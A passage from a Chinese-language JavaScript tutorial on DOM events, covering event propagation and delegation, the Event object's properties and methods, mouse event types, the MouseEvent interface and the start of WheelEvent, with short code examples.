      p.addEventListener('click', callback, true);
      div.addEventListener('click', callback, false);
      p.addEventListener('click', callback, false);
   
      function callback(event) {
        var tag = event.currentTarget.tagName;
        var phase = phases[event.eventPhase];
        console.log("Tag: '" + tag + "'. EventPhase: '" + phase + "'");
      }
   
      // 点击以后的结果
      // Tag: 'DIV'. EventPhase: 'capture'
      // Tag: 'P'. EventPhase: 'target'
      // Tag: 'P'. EventPhase: 'target'
      // Tag: 'DIV'. EventPhase: 'bubble'

   上面代码表示， ``click`` 事件被触发了四次： ``<div>`` 节点的捕获阶段和冒泡阶段各1次， ``<p>`` 节点的目标阶段触发了2次。

   1. 捕获阶段：事件从 ``<div>`` 向 ``<p>`` 传播时，触发 ``<div>`` 的 ``click`` 事件；
   2. 目标阶段：事件从 ``<div>`` 到达 ``<p>`` 时，触发 ``<p>`` 的 ``click`` 事件；
   3. 冒泡阶段：事件从 ``<p>`` 传回 ``<div>`` 时，再次触发 ``<div>`` 的 ``click`` 事件。

   其中， ``<p>`` 节点有两个监听函数（ ``addEventListener`` 方法第三个参数的不同，会导致绑定两个监听函数），因此它们都会因为 ``click`` 事件触发一次。所以， ``<p>`` 会在 ``target`` 阶段有两次输出。

   注意，浏览器总是假定 ``click`` 事件的目标节点，就是点击位置嵌套最深的那个节点（本例是 ``<div>`` 节点里面的 ``<p>`` 节点）。所以， ``<p>`` 节点的捕获阶段和冒泡阶段，都会显示为 ``target`` 阶段。

   事件传播的最上层对象是 ``window`` ，接着依次是 ``document`` ， ``html`` （ ``document.documentElement`` ）和 ``body`` （ ``document.body`` ）。也就是说，上例的事件传播顺序，在捕获阶段依次为 ``window`` 、 ``document`` 、 ``html`` 、 ``body`` 、 ``div`` 、 ``p`` ，在冒泡阶段依次为 ``p`` 、 ``div`` 、 ``body`` 、 ``html`` 、 ``document`` 、 ``window`` 。

事件的代理
--------

   由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理（delegation）。

   .. code:: javascript

      var ul = document.querySelector('ul');
   
      ul.addEventListener('click', function (event) {
        if (event.target.tagName.toLowerCase() === 'li') {
          // some code
        }
      });

   上面代码中， ``click`` 事件的监听函数定义在 ``<ul>`` 节点，但是实际上，它处理的是子节点 ``<li>`` 的 ``click`` 事件。这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，而不用在每个 ``<li>`` 节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。

   如果希望事件到某个节点为止，不再传播，可以使用事件对象的 ``stopPropagation`` 方法。

   .. code:: javascript

      // 事件传播到 p 元素后，就不再向下传播了
      p.addEventListener('click', function (event) {
        event.stopPropagation();
      }, true);
   
      // 事件冒泡到 p 元素后，就不再向上冒泡了
      p.addEventListener('click', function (event) {
        event.stopPropagation();
      }, false);

   上面代码中， ``stopPropagation`` 方法分别在捕获阶段和冒泡阶段，阻止了事件的传播。

   但是， ``stopPropagation`` 方法只会阻止事件的传播，不会阻止该事件触发 ``<p>`` 节点的其他 ``click`` 事件的监听函数。也就是说，不是彻底取消 ``click`` 事件。

   .. code:: javascript

      p.addEventListener('click', function (event) {
        event.stopPropagation();
        console.log(1);
      });
   
      p.addEventListener('click', function(event) {
        // 会触发
        console.log(2);
      });

   上面代码中， ``p`` 元素绑定了两个 ``click`` 事件的监听函数。 ``stopPropagation`` 方法只能阻止这个事件的传播，不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是1，然后是2。

   如果想要彻底取消该事件，不再触发后面所有 ``click`` 的监听函数，可以使用 ``stopImmediatePropagation`` 方法。

   .. code:: javascript

      p.addEventListener('click', function (event) {
        event.stopImmediatePropagation();
        console.log(1);
      });
   
      p.addEventListener('click', function(event) {
        // 不会被触发
        console.log(2);
      });

   上面代码中， ``stopImmediatePropagation`` 方法可以彻底取消这个事件，使得后面绑定的所有 ``click`` 监听函数都不再触发。所以，只会输出1，不会输出2。

/🟠 Event 对象
==============

概述
---

   事件发生以后，会产生一个事件对象，作为参数传给监听函数。浏览器原生提供一个 ``Event`` 对象，所有的事件都是这个对象的实例，或者说继承了 ``Event.prototype`` 对象。

    ``Event`` 对象本身就是一个构造函数，可以用来生成新的实例。

   .. code:: javascript

      event = new Event(type, options);

    ``Event`` 构造函数接受两个参数。第一个参数 ``type`` 是字符串，表示事件的名称；第二个参数 ``options`` 是一个对象，表示事件对象的配置。该对象主要有下面两个属性。

   -  ``bubbles`` ：布尔值，可选，默认为 ``false`` ，表示事件对象是否冒泡。
   -  ``cancelable`` ：布尔值，可选，默认为 ``false`` ，表示事件是否可以被取消，即能否用 ``Event.preventDefault()`` 取消这个事件。一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。

   .. code:: javascript

      var ev = new Event(
        'look',
        {
          'bubbles': true,
          'cancelable': false
        }
      );
      document.dispatchEvent(ev);

   上面代码新建一个 ``look`` 事件实例，然后使用 ``dispatchEvent`` 方法触发该事件。

   注意，如果不是显式指定 ``bubbles`` 属性为 ``true`` ，生成的事件就只能在“捕获阶段”触发监听函数。

   .. code:: javascript

      // HTML 代码为
      // <div><p>Hello</p></div>
      var div = document.querySelector('div');
      var p = document.querySelector('p');
   
      function callback(event) {
        var tag = event.currentTarget.tagName;
        console.log('Tag: ' + tag); // 没有任何输出
      }
   
      div.addEventListener('click', callback, false);
   
      var click = new Event('click');
      p.dispatchEvent(click);

   上面代码中， ``p`` 元素发出一个 ``click`` 事件，该事件默认不会冒泡。 ``div.addEventListener`` 方法指定在冒泡阶段监听，因此监听函数不会触发。如果写成 ``div.addEventListener('click', callback, true)`` ，那么在“捕获阶段”可以监听到这个事件。

   另一方面，如果这个事件在 ``div`` 元素上触发。

   .. code:: javascript

      div.dispatchEvent(click);

   那么，不管 ``div`` 元素是在冒泡阶段监听，还是在捕获阶段监听，都会触发监听函数。因为这时 ``div`` 元素是事件的目标，不存在是否冒泡的问题， ``div`` 元素总是会接收到事件，因此导致监听函数生效。

实例属性
-------


Event.bubbles，Event.eventPhase
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Event.bubbles`` 属性返回一个布尔值，表示当前事件是否会冒泡。该属性为只读属性，一般用来了解 Event 实例是否可以冒泡。前面说过，除非显式声明， ``Event`` 构造函数生成的事件，默认是不冒泡的。

    ``Event.eventPhase`` 属性返回一个整数常量，表示事件目前所处的阶段。该属性只读。

   .. code:: javascript

      var phase = event.eventPhase;

    ``Event.eventPhase`` 的返回值有四种可能。

   - 0，事件目前没有发生。
   - 1，事件目前处于捕获阶段，即处于从祖先节点向目标节点的传播过程中。
   - 2，事件到达目标节点，即 ``Event.target`` 属性指向的那个节点。
   - 3，事件处于冒泡阶段，即处于从目标节点向祖先节点的反向传播过程中。

Event.cancelable，Event.cancelBubble，event.defaultPrevented
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Event.cancelable`` 属性返回一个布尔值，表示事件是否可以取消。该属性为只读属性，一般用来了解 Event 实例的特性。

   大多数浏览器的原生事件是可以取消的。比如，取消 ``click`` 事件，点击链接将无效。但是除非显式声明， ``Event`` 构造函数生成的事件，默认是不可以取消的。

   .. code:: javascript

      var evt = new Event('foo');
      evt.cancelable  // false

   当 ``Event.cancelable`` 属性为 ``true`` 时，调用 ``Event.preventDefault()`` 就可以取消这个事件，阻止浏览器对该事件的默认行为。

   如果事件不能取消，调用 ``Event.preventDefault()`` 会没有任何效果。所以使用这个方法之前，最好用 ``Event.cancelable`` 属性判断一下是否可以取消。

   .. code:: javascript

      function preventEvent(event) {
        if (event.cancelable) {
          event.preventDefault();
        } else {
          console.warn('This event couldn\'t be canceled.');
          console.dir(event);
        }
      }

    ``Event.cancelBubble`` 属性是一个布尔值，如果设为 ``true`` ，相当于执行 ``Event.stopPropagation()`` ，可以阻止事件的传播。

    ``Event.defaultPrevented`` 属性返回一个布尔值，表示该事件是否调用过 ``Event.preventDefault`` 方法。该属性只读。

   .. code:: javascript

      if (event.defaultPrevented) {
        console.log('该事件已经取消了');
      }

Event.currentTarget，Event.target
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   事件发生以后，会经过捕获和冒泡两个阶段，依次通过多个 DOM 节点。因此，任意事件都有两个与事件相关的节点，一个是事件的原始触发节点（ ``Event.target`` ），另一个是事件当前正在通过的节点（ ``Event.currentTarget`` ）。前者通常是后者的后代节点。

    ``Event.currentTarget`` 属性返回事件当前所在的节点，即事件当前正在通过的节点，也就是当前正在执行的监听函数所在的那个节点。随着事件的传播，这个属性的值会变。

    ``Event.target`` 属性返回原始触发事件的那个节点，即事件最初发生的节点。这个属性不会随着事件的传播而改变。

   事件传播过程中，不同节点的监听函数内部的 ``Event.target`` 与 ``Event.currentTarget`` 属性的值是不一样的。

   .. code:: javascript

      // HTML 代码为
      // <p id="para">Hello <em>World</em></p>
      function hide(e) {
        // 不管点击 Hello 或 World，总是返回 true
        console.log(this === e.currentTarget);
   
        // 点击 Hello，返回 true
        // 点击 World，返回 false
        console.log(this === e.target);
      }
   
      document.getElementById('para').addEventListener('click', hide, false);

   上面代码中， ``<em>`` 是 ``<p>`` 的子节点，点击 ``<em>`` 或者点击 ``<p>`` ，都会导致监听函数执行。这时， ``e.target`` 总是指向原始点击位置的那个节点，而 ``e.currentTarget`` 指向事件传播过程中正在经过的那个节点。由于监听函数只有事件经过时才会触发，所以 ``e.currentTarget`` 总是等同于监听函数内部的 ``this`` 。

Event.type
~~~~~~~~~~~

    ``Event.type`` 属性返回一个字符串，表示事件类型。事件的类型是在生成事件的时候指定的。该属性只读。

   .. code:: javascript

      var evt = new Event('foo');
      evt.type // "foo"

Event.timeStamp
~~~~~~~~~~~~~~~~

    ``Event.timeStamp`` 属性返回一个毫秒时间戳，表示事件发生的时间。它是相对于网页加载成功开始计算的。

   .. code:: javascript

      var evt = new Event('foo');
      evt.timeStamp // 3683.6999999995896

   它的返回值有可能是整数，也有可能是小数（高精度时间戳），取决于浏览器的设置。

   下面是一个计算鼠标移动速度的例子，显示每秒移动的像素数量。

   .. code:: javascript

      var previousX;
      var previousY;
      var previousT;
   
      window.addEventListener('mousemove', function(event) {
        if (
          previousX !== undefined &&
          previousY !== undefined &&
          previousT !== undefined
        ) {
          var deltaX = event.screenX - previousX;
          var deltaY = event.screenY - previousY;
          var deltaD = Math.sqrt(Math.pow(deltaX, 2) + Math.pow(deltaY, 2));
   
          var deltaT = event.timeStamp - previousT;
          console.log(deltaD / deltaT * 1000);
        }
   
        previousX = event.screenX;
        previousY = event.screenY;
        previousT = event.timeStamp;
      });

Event.isTrusted
~~~~~~~~~~~~~~~~

    ``Event.isTrusted`` 属性返回一个布尔值，表示该事件是否由真实的用户行为产生。比如，用户点击链接会产生一个 ``click`` 事件，该事件是用户产生的； ``Event`` 构造函数生成的事件，则是脚本产生的。

   .. code:: javascript

      var evt = new Event('foo');
      evt.isTrusted // false

   上面代码中， ``evt`` 对象是脚本产生的，所以 ``isTrusted`` 属性返回 ``false`` 。

Event.detail
~~~~~~~~~~~~~

    ``Event.detail`` 属性只有浏览器的 UI （用户界面）事件才具有。该属性返回一个数值，表示事件的某种信息。具体含义与事件类型相关。比如，对于 ``click`` 和 ``dblclick`` 事件， ``Event.detail`` 是鼠标按下的次数（ ``1`` 表示单击， ``2`` 表示双击， ``3`` 表示三击）；对于鼠标滚轮事件， ``Event.detail`` 是滚轮正向滚动的距离，负值就是负向滚动的距离，返回值总是3的倍数。

   .. code:: javascript

      // HTML 代码如下
      // <p>Hello</p>
      function giveDetails(e) {
        console.log(e.detail);
      }
   
      document.querySelector('p').onclick = giveDetails;

实例方法
-------


Event.preventDefault()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Event.preventDefault`` 方法取消浏览器对当前事件的默认行为。比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。该方法生效的前提是，事件对象的 ``cancelable`` 属性为 ``true`` ，如果为 ``false`` ，调用该方法没有任何效果。

   注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播。如果要阻止传播，可以使用 ``stopPropagation()`` 或 ``stopImmediatePropagation()`` 方法。

   .. code:: javascript

      // HTML 代码为
      // <input type="checkbox" id="my-checkbox" />
      var cb = document.getElementById('my-checkbox');
   
      cb.addEventListener(
        'click',
        function (e){ e.preventDefault(); },
        false
      );

   上面代码中，浏览器的默认行为是单击会选中单选框，取消这个行为，就导致无法选中单选框。

   利用这个方法，可以为文本输入框设置校验条件。如果用户的输入不符合条件，就无法将字符输入文本框。

   .. code:: javascript

      // HTML 代码为
      // <input type="text" id="my-input" />
      var input = document.getElementById('my-input');
      input.addEventListener('keypress', checkName, false);
   
      function checkName(e) {
        if (e.charCode < 97 || e.charCode > 122) {
          e.preventDefault();
        }
      }

   上面代码为文本框的 ``keypress`` 事件设定监听函数后，将只能输入小写字母，否则输入事件的默认行为（写入文本框）将被取消，导致不能向文本框输入内容。

Event.stopPropagation()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``stopPropagation`` 方法阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，但是不包括在当前节点上其他的事件监听函数。

   .. code:: javascript

      function stopEvent(e) {
        e.stopPropagation();
      }
   
      el.addEventListener('click', stopEvent, false);

   上面代码中， ``click`` 事件将不会进一步冒泡到 ``el`` 节点的父节点。

Event.stopImmediatePropagation()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Event.stopImmediatePropagation`` 方法阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。也就是说，该方法阻止事件的传播，比 ``Event.stopPropagation()`` 更彻底。

   如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。只要其中有一个监听函数调用了 ``Event.stopImmediatePropagation`` 方法，其他的监听函数就不会再执行了。

   .. code:: javascript

      function l1(e){
        e.stopImmediatePropagation();
      }
   
      function l2(e){
        console.log('hello world');
      }
   
      el.addEventListener('click', l1, false);
      el.addEventListener('click', l2, false);

   上面代码在 ``el`` 节点上，为 ``click`` 事件添加了两个监听函数 ``l1`` 和 ``l2`` 。由于 ``l1`` 调用了 ``event.stopImmediatePropagation`` 方法，所以 ``l2`` 不会被调用。

Event.composedPath()
~~~~~~~~~~~~~~~~~~~~~

    ``Event.composedPath()`` 返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。

   .. code:: javascript

      // HTML 代码如下
      // <div>
      //   <p>Hello</p>
      // </div>
      var div = document.querySelector('div');
      var p = document.querySelector('p');
   
      div.addEventListener('click', function (e) {
        console.log(e.composedPath());
      }, false);
      // [p, div, body, html, document, Window]

   上面代码中， ``click`` 事件的最底层节点是 ``p`` ，向上依次是 ``div`` 、 ``body`` 、 ``html`` 、 ``document`` 、 ``Window`` 。

/🟠 鼠标事件
===========

鼠标事件的种类
------------

   鼠标事件主要有下面这些，所有事件都继承了 ``MouseEvent`` 接口（详见后文）。

   （1）点击事件

   鼠标点击相关的有四个事件。

   -  ``click`` ：按下鼠标（通常是按下主按钮）时触发。
   -  ``dblclick`` ：在同一个元素上双击鼠标时触发。
   -  ``mousedown`` ：按下鼠标键时触发。
   -  ``mouseup`` ：释放按下的鼠标键时触发。

    ``click`` 事件可以看成是两个事件组成的：用户在同一个位置先触发 ``mousedown`` ，再触发 ``mouseup`` 。因此，触发顺序是， ``mousedown`` 首先触发， ``mouseup`` 接着触发， ``click`` 最后触发。

   双击时， ``dblclick`` 事件则会在 ``mousedown`` 、 ``mouseup`` 、 ``click`` 之后触发。

   （2）移动事件

   鼠标移动相关的有五个事件。

   -  ``mousemove`` ：当鼠标在一个节点内部移动时触发。当鼠标持续移动时，该事件会连续触发。为了避免性能问题，建议对该事件的监听函数做一些限定，比如限定一段时间内只能运行一次。
   -  ``mouseenter`` ：鼠标进入一个节点时触发，进入子节点不会触发这个事件（详见后文）。
   -  ``mouseover`` ：鼠标进入一个节点时触发，进入子节点会再一次触发这个事件（详见后文）。
   -  ``mouseout`` ：鼠标离开一个节点时触发，离开父节点也会触发这个事件（详见后文）。
   -  ``mouseleave`` ：鼠标离开一个节点时触发，离开父节点不会触发这个事件（详见后文）。

    ``mouseover`` 事件和 ``mouseenter`` 事件，都是鼠标进入一个节点时触发。两者的区别是， ``mouseenter`` 事件只触发一次，而只要鼠标在节点内部移动， ``mouseover`` 事件会在子节点上触发多次。

   .. code:: javascript

      /* HTML 代码如下
       <ul>
         <li>item 1</li>
         <li>item 2</li>
         <li>item 3</li>
       </ul>
      */
   
      var ul = document.querySelector('ul');
   
      // 进入 ul 节点以后，mouseenter 事件只会触发一次
      // 以后只要鼠标在节点内移动，都不会再触发这个事件
      // event.target 是 ul 节点
      ul.addEventListener('mouseenter', function (event) {
        event.target.style.color = 'purple';
        setTimeout(function () {
          event.target.style.color = '';
        }, 500);
      }, false);
   
      // 进入 ul 节点以后，只要在子节点上移动，mouseover 事件会触发多次
      // event.target 是 li 节点
      ul.addEventListener('mouseover', function (event) {
        event.target.style.color = 'orange';
        setTimeout(function () {
          event.target.style.color = '';
        }, 500);
      }, false);

   上面代码中，在父节点内部进入子节点，不会触发 ``mouseenter`` 事件，但是会触发 ``mouseover`` 事件。

    ``mouseout`` 事件和 ``mouseleave`` 事件，都是鼠标离开一个节点时触发。两者的区别是，在父元素内部离开一个子元素时， ``mouseleave`` 事件不会触发，而 ``mouseout`` 事件会触发。

   .. code:: javascript

      /* HTML 代码如下
       <ul>
         <li>item 1</li>
         <li>item 2</li>
         <li>item 3</li>
       </ul>
      */
   
      var ul = document.querySelector('ul');
   
      // 先进入 ul 节点，然后在节点内部移动，不会触发 mouseleave 事件
      // 只有离开 ul 节点时，触发一次 mouseleave
      // event.target 是 ul 节点
      ul.addEventListener('mouseleave', function (event) {
        event.target.style.color = 'purple';
        setTimeout(function () {
          event.target.style.color = '';
        }, 500);
      }, false);
   
      // 先进入 ul 节点，然后在节点内部移动，mouseout 事件会触发多次
      // event.target 是 li 节点
      ul.addEventListener('mouseout', function (event) {
        event.target.style.color = 'orange';
        setTimeout(function () {
          event.target.style.color = '';
        }, 500);
      }, false);

   上面代码中，在父节点内部离开子节点，不会触发 ``mouseleave`` 事件，但是会触发 ``mouseout`` 事件。

   （3）其他事件

   -  ``contextmenu`` ：按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文”菜单键时触发。
   -  ``wheel`` ：滚动鼠标的滚轮时触发，该事件继承的是 ``WheelEvent`` 接口。

MouseEvent 接口
--------------

    ``MouseEvent`` 接口代表了鼠标相关的事件，单击（click）、双击（dblclick）、松开鼠标键（mouseup）、按下鼠标键（mousedown）等动作，所产生的事件对象都是 ``MouseEvent`` 实例。此外，滚轮事件和拖拉事件也是 ``MouseEvent`` 实例。

    ``MouseEvent`` 接口继承了 ``Event`` 接口，所以拥有 ``Event`` 的所有属性和方法，并且还提供鼠标独有的属性和方法。

   浏览器原生提供一个 ``MouseEvent()`` 构造函数，用于新建一个 ``MouseEvent`` 实例。

   .. code:: javascript

      var event = new MouseEvent(type, options);

    ``MouseEvent()`` 构造函数接受两个参数。第一个参数是字符串，表示事件名称；第二个参数是一个事件配置对象，该参数可选。除了 ``Event`` 接口的实例配置属性，该对象可以配置以下属性，所有属性都是可选的。

   -  ``screenX`` ：数值，鼠标相对于屏幕的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。
   -  ``screenY`` ：数值，鼠标相对于屏幕的垂直位置（单位像素），其他与 ``screenX`` 相同。
   -  ``clientX`` ：数值，鼠标相对于程序窗口的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。
   -  ``clientY`` ：数值，鼠标相对于程序窗口的垂直位置（单位像素），其他与 ``clientX`` 相同。
   -  ``ctrlKey`` ：布尔值，是否同时按下了 Ctrl 键，默认值为 ``false`` 。
   -  ``shiftKey`` ：布尔值，是否同时按下了 Shift 键，默认值为 ``false`` 。
   -  ``altKey`` ：布尔值，是否同时按下 Alt 键，默认值为 ``false`` 。
   -  ``metaKey`` ：布尔值，是否同时按下 Meta 键，默认值为 ``false`` 。
   -  ``button`` ：数值，表示按下了哪一个鼠标按键，默认值为 ``0`` ，表示按下主键（通常是鼠标的左键）或者当前事件没有定义这个属性； ``1`` 表示按下辅助键（通常是鼠标的中间键）， ``2`` 表示按下次要键（通常是鼠标的右键）。
   -  ``buttons`` ：数值，表示按下了鼠标的哪些键，是一个三个比特位的二进制值，默认为 ``0`` （没有按下任何键）。 ``1`` （二进制 ``001`` ）表示按下主键（通常是左键）， ``2`` （二进制 ``010`` ）表示按下次要键（通常是右键）， ``4`` （二进制 ``100`` ）表示按下辅助键（通常是中间键）。因此，如果返回 ``3`` （二进制 ``011`` ）就表示同时按下了左键和右键。
   -  ``relatedTarget`` ：节点对象，表示事件的相关节点，默认为 ``null`` 。 ``mouseenter`` 和 ``mouseover`` 事件时，表示鼠标刚刚离开的那个元素节点； ``mouseout`` 和 ``mouseleave`` 事件时，表示鼠标正在进入的那个元素节点。

   下面是一个例子。

   .. code:: javascript

      function simulateClick() {
        var event = new MouseEvent('click', {
          'bubbles': true,
          'cancelable': true
        });
        var cb = document.getElementById('checkbox');
        cb.dispatchEvent(event);
      }

   上面代码生成一个鼠标点击事件，并触发该事件。

MouseEvent 接口的实例属性
-----------------------


MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



   -  ``altKey`` 属性：Alt 键
   -  ``ctrlKey`` 属性：Ctrl 键
   -  ``metaKey`` 属性：Meta 键（Mac 键盘是一个四瓣的小花，Windows 键盘是 Windows 键）
   -  ``shiftKey`` 属性：Shift 键

   .. code:: javascript

      // HTML 代码如下
      // <body onclick="showKey(event)">
      function showKey(e) {
        console.log('ALT key pressed: ' + e.altKey);
        console.log('CTRL key pressed: ' + e.ctrlKey);
        console.log('META key pressed: ' + e.metaKey);
        console.log('SHIFT key pressed: ' + e.shiftKey);
      }

   上面代码中，点击网页会输出是否同时按下对应的键。

MouseEvent.button，MouseEvent.buttons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.button`` 属性返回一个数值，表示事件发生时按下了鼠标的哪个键。该属性只读。

   - 0：按下主键（通常是左键），或者该事件没有初始化这个属性（比如 ``mousemove`` 事件）。
   - 1：按下辅助键（通常是中键或者滚轮键）。
   - 2：按下次键（通常是右键）。

   .. code:: javascript

      // HTML 代码为
      // <button onmouseup="whichButton(event)">点击</button>
      var whichButton = function (e) {
        switch (e.button) {
          case 0:
            console.log('Left button clicked.');
            break;
          case 1:
            console.log('Middle button clicked.');
            break;
          case 2:
            console.log('Right button clicked.');
            break;
          default:
            console.log('Unexpected code: ' + e.button);
        }
      }

    ``MouseEvent.buttons`` 属性返回一个三个比特位的值，表示同时按下了哪些键。它用来处理同时按下多个鼠标键的情况。该属性只读。

   - 1：二进制为 ``001`` （十进制的1），表示按下左键。
   - 2：二进制为 ``010`` （十进制的2），表示按下右键。
   - 4：二进制为 ``100`` （十进制的4），表示按下中键或滚轮键。

   同时按下多个键的时候，每个按下的键对应的比特位都会有值。比如，同时按下左键和右键，会返回3（二进制为011）。

MouseEvent.clientX，MouseEvent.clientY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.clientX`` 属性返回鼠标位置相对于浏览器窗口左上角的水平坐标（单位像素）， ``MouseEvent.clientY`` 属性返回垂直坐标。这两个属性都是只读属性。

   .. code:: javascript

      // HTML 代码为
      // <body onmousedown="showCoords(event)">
      function showCoords(evt){
        console.log(
          'clientX value: ' + evt.clientX + '\n' +
          'clientY value: ' + evt.clientY + '\n'
        );
      }

   这两个属性还分别有一个别名 ``MouseEvent.x`` 和 ``MouseEvent.y`` 。

MouseEvent.movementX，MouseEvent.movementY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.movementX`` 属性返回当前位置与上一个 ``mousemove`` 事件之间的水平距离（单位像素）。数值上，它等于下面的计算公式。

   .. code:: javascript

      currentEvent.movementX = currentEvent.screenX - previousEvent.screenX

    ``MouseEvent.movementY`` 属性返回当前位置与上一个 ``mousemove`` 事件之间的垂直距离（单位像素）。数值上，它等于下面的计算公式。

   .. code:: javascript

      currentEvent.movementY = currentEvent.screenY - previousEvent.screenY。

   这两个属性都是只读属性。

MouseEvent.screenX，MouseEvent.screenY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.screenX`` 属性返回鼠标位置相对于屏幕左上角的水平坐标（单位像素）， ``MouseEvent.screenY`` 属性返回垂直坐标。这两个属性都是只读属性。

   .. code:: javascript

      // HTML 代码如下
      // <body onmousedown="showCoords(event)">
      function showCoords(evt) {
        console.log(
          'screenX value: ' + evt.screenX + '\n',
          'screenY value: ' + evt.screenY + '\n'
        );
      }

MouseEvent.offsetX，MouseEvent.offsetY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.offsetX`` 属性返回鼠标位置与目标节点左侧的 ``padding`` 边缘的水平距离（单位像素）， ``MouseEvent.offsetY`` 属性返回与目标节点上方的 ``padding`` 边缘的垂直距离。这两个属性都是只读属性。

   .. code:: javascript

      /* HTML 代码如下
        <style>
          p {
            width: 100px;
            height: 100px;
            padding: 100px;
          }
        </style>
        <p>Hello</p>
      */
      var p = document.querySelector('p');
      p.addEventListener(
        'click',
        function (e) {
          console.log(e.offsetX);
          console.log(e.offsetY);
        },
        false
      );

   上面代码中，鼠标如果在 ``p`` 元素的中心位置点击，会返回 ``150 150`` 。因此中心位置距离左侧和上方的 ``padding`` 边缘，等于 ``padding`` 的宽度（100像素）加上元素内容区域一半的宽度（50像素）。

MouseEvent.pageX，MouseEvent.pageY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.pageX`` 属性返回鼠标位置与文档左侧边缘的距离（单位像素）， ``MouseEvent.pageY`` 属性返回与文档上侧边缘的距离（单位像素）。它们的返回值都包括文档不可见的部分。这两个属性都是只读。

   .. code:: javascript

      /* HTML 代码如下
        <style>
          body {
            height: 2000px;
          }
        </style>
      */
      document.body.addEventListener(
        'click',
        function (e) {
          console.log(e.pageX);
          console.log(e.pageY);
        },
        false
      );

   上面代码中，页面高度为2000像素，会产生垂直滚动条。滚动到页面底部，点击鼠标输出的 ``pageY`` 值会接近2000。

MouseEvent.relatedTarget
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.relatedTarget`` 属性返回事件的相关节点。对于那些没有相关节点的事件，该属性返回 ``null`` 。该属性只读。

   下表列出不同事件的 ``target`` 属性值和 ``relatedTarget`` 属性值义。

   |事件名称 |target 属性 |relatedTarget 属性 |
   |---------|-----------|------------------|
   |focusin |接受焦点的节点 |丧失焦点的节点 |
   |focusout |丧失焦点的节点 |接受焦点的节点 |
   |mouseenter |将要进入的节点 |将要离开的节点 |
   |mouseleave |将要离开的节点 |将要进入的节点 |
   |mouseout |将要离开的节点 |将要进入的节点 |
   |mouseover |将要进入的节点 |将要离开的节点 |
   |dragenter |将要进入的节点 |将要离开的节点 |
   |dragexit |将要离开的节点 |将要进入的节点 |

   下面是一个例子。

   .. code:: javascript

      /*
        HTML 代码如下
        <div id="outer" style="height:50px;width:50px;border:1px solid black;">
          <div id="inner" style="height:25px;width:25px;border:1px solid black;"></div>
        </div>
      */
   
      var inner = document.getElementById('inner');
      inner.addEventListener('mouseover', function (event) {
        console.log('进入' + event.target.id + ' 离开' + event.relatedTarget.id);
      }, false);
      inner.addEventListener('mouseenter', function (event) {
        console.log('进入' + event.target.id + ' 离开' + event.relatedTarget.id);
      });
      inner.addEventListener('mouseout', function (event) {
        console.log('离开' + event.target.id + ' 进入' + event.relatedTarget.id);
      });
      inner.addEventListener("mouseleave", function (event){
        console.log('离开' + event.target.id + ' 进入' + event.relatedTarget.id);
      });
   
      // 鼠标从 outer 进入inner，输出
      // 进入inner 离开outer
      // 进入inner 离开outer
   
      // 鼠标从 inner进入 outer，输出
      // 离开inner 进入outer
      // 离开inner 进入outer

MouseEvent 接口的实例方法
-----------------------


MouseEvent.getModifierState()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``MouseEvent.getModifierState`` 方法返回一个布尔值，表示有没有按下特定的功能键。它的参数是一个表示[功能键](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/getModifierState#Modifier_keys_on_Gecko)的字符串。

   .. code:: javascript

      document.addEventListener('click', function (e) {
        console.log(e.getModifierState('CapsLock'));
      }, false);

   上面的代码可以了解用户是否按下了大写键。

WheelEvent 接口
--------------


概述
~~~

   WheelEvent 接口继承了 MouseEvent 实例，代表鼠标滚轮事件的实例对象。目前，鼠标滚轮相关的事件只有一个 ``wheel`` 事件，用户滚动鼠标的滚轮，就生成这个事件的实例。

   浏览器原生提供 ``WheelEvent()`` 构造函数，用来生成 ``WheelEvent`` 实例。

   .. code:: javascript

      var wheelEvent = new WheelEvent(type, options);

    ``WheelEvent()`` 构造函数可以接受两个参数，第一个是字符串，表示事件类型，对于滚轮事件来说，这个值目前只能是 ``wheel`` 。第二个参数是事件的配置对象。该对象的属性除了 ``Event`` 、 ``UIEvent`` 的配置属性以外，还可以接受以下几个属性，所有属性都是可选的。

   -  ``deltaX`` ：数值，表示滚轮的水平滚动量，默认值是 0.0。
   -  ``deltaY`` ：数值，表示滚轮的垂直滚动量，默认值是 0.0。
